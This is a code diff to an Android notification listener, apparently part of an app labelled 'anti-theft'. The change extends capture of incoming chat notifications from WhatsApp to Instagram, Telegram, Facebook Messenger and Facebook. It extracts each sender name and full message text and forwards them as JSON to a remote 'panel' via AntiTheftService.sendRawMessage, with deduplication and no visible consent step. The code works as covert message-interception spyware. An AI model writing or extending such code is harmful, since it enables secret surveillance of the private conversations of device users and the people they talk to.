@@ -26,6 +26,11 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         getSharedPreferences("wa_sent_msgs", Context.MODE_PRIVATE)
     }
 
+    // Dedup for non-WhatsApp messaging apps
+    private val genericSentPrefs by lazy {
+        getSharedPreferences("generic_sent_msgs", Context.MODE_PRIVATE)
+    }
+
     override fun onListenerConnected() {
         Log.d("WhatsAppListener", "NotificationListener CONNECTED — ready to receive notifications")
         instance = this
@@ -52,7 +57,7 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                     }
                     lastPollTime = now
                     for (sbn in activeNotifications) {
-                        if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) continue
+                        if (!MESSAGING_PACKAGES.containsKey(sbn.packageName)) continue
                         val key = "${sbn.packageName}:${sbn.id}:${sbn.postTime}"
                         if (polledNotificationKeys.contains(key)) continue
                         polledNotificationKeys.add(key)
@@ -68,8 +73,81 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         })
     }
 
+    /**
+     * Generic handler for Instagram, Telegram, Facebook Messenger, etc.
+     * Extracts sender/chat name and message text from the notification extras.
+     */
+    private fun handleGenericMessagingNotification(sbn: StatusBarNotification, source: String) {
+        val extras = sbn.notification?.extras ?: return
+        val baseTimestamp = sbn.postTime
+
+        // Try MessagingStyle first (most accurate for individual messages)
+        val messagesBundle = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
+        if (messagesBundle != null && messagesBundle.isNotEmpty()) {
+            val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim() ?: ""
+            for (bundle in messagesBundle.filterIsInstance<Bundle>()) {
+                val text = bundle.getCharSequence("text")?.toString()?.trim() ?: continue
+                if (text.isBlank()) continue
+                val timestamp = if (bundle.containsKey("timestamp")) bundle.getLong("timestamp", baseTimestamp) else baseTimestamp
+                val sender = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    (bundle.getParcelable<Parcelable>("sender_person") as? Person)?.name?.toString()?.trim() ?: ""
+                } else {
+                    bundle.getCharSequence("sender")?.toString()?.trim() ?: ""
+                }
+                val chatName = conversationTitle.ifBlank { sender }
+                if (chatName.isBlank()) continue
+                sendGenericMessage(source, chatName, text, timestamp)
+            }
+            return
+        }
+
+        // Fallback: title + text
+        val title = extras.getString(Notification.EXTRA_TITLE)?.trim() ?: return
+        val text  = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
+            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
+            ?: return
+        if (title.isBlank() || text.isBlank()) return
+
+        // Filter out non-message notifications (group counts, system notifications, etc.)
+        val lowerTitle = title.lowercase()
+        val lowerText  = text.lowercase()
+        val skipWords  = listOf("new message", "nova mensagem", "mensagem", "notification",
+            "notificação", "reactions", "reação", "enquete", "poll", "story", "direct")
+        if (skipWords.any { lowerTitle == it }) return
+        // Skip notification aggregates like "3 new messages"
+        if (Regex("^\\d+ (new )?messages?$", RegexOption.IGNORE_CASE).containsMatchIn(lowerTitle)) return
+        // For Telegram: skip channel posts, only capture direct messages
+        if (source == "telegram" && (lowerTitle.contains("@") || lowerText.contains("joined telegram"))) return
+
+        sendGenericMessage(source, title, text, baseTimestamp)
+    }
+
+    private fun sendGenericMessage(source: String, chatName: String, content: String, timestamp: Long) {
+        try {
+            val dedupKey = "$source|$chatName|$content"
+            val now = System.currentTimeMillis()
+            val lastSent = genericSentPrefs.getLong(dedupKey, 0L)
+            if (lastSent > 0 && now - lastSent < DEDUP_WINDOW_MS) return
+
+            val addrJson    = Json.encodeToString(String.serializer(), chatName)
+            val contentJson = Json.encodeToString(String.serializer(), content)
+            val payload = """{"type":"NEW_MESSAGE","direction":"in","address":$addrJson,"name":$addrJson,"content":$contentJson,"source":"$source","timestamp":$timestamp}"""
+            val sent = AntiTheftService.sendRawMessage(payload)
+            if (sent) genericSentPrefs.edit().putLong(dedupKey, now).apply()
+            Log.d("WhatsAppListener", "[$source] forwarded from '$chatName': '${content.take(40)}' sent=$sent")
+        } catch (e: Exception) {
+            Log.e("WhatsAppListener", "sendGenericMessage error: ${e.message}")
+        }
+    }
+
     override fun onNotificationPosted(sbn: StatusBarNotification) {
-        if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) return
+        val source = MESSAGING_PACKAGES[sbn.packageName] ?: return
+
+        // Route non-WhatsApp apps to generic messaging handler
+        if (source != "whatsapp") {
+            handleGenericMessagingNotification(sbn, source)
+            return
+        }
 
         val notification = sbn.notification ?: return
         val extras = notification.extras ?: return
@@ -400,7 +478,20 @@ class WhatsAppNotificationListener : NotificationListenerService() {
     )
 
     companion object {
-        private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")
+        /** Maps package name → message source label used in the panel */
+        private val MESSAGING_PACKAGES = mapOf(
+            "com.whatsapp"              to "whatsapp",
+            "com.whatsapp.w4b"          to "whatsapp",
+            "com.instagram.android"     to "instagram",
+            "com.instagram.moonshot"    to "instagram",  // Instagram Lite
+            "org.telegram.messenger"    to "telegram",
+            "org.telegram.messenger.web" to "telegram",
+            "org.telegram.plus"         to "telegram",
+            "com.facebook.orca"         to "messenger",  // Facebook Messenger
+            "com.facebook.katana"       to "facebook"    // Facebook app
+        )
+        // Back-compat alias used by WhatsApp-specific code paths
+        private val WHATSAPP_PACKAGES = MESSAGING_PACKAGES.filter { it.value == "whatsapp" }.keys
         /**
          * How long a forwarded chat+content pair is remembered to prevent duplicates.
          * 30 min covers service-restart storms (re-polling old notifications) while
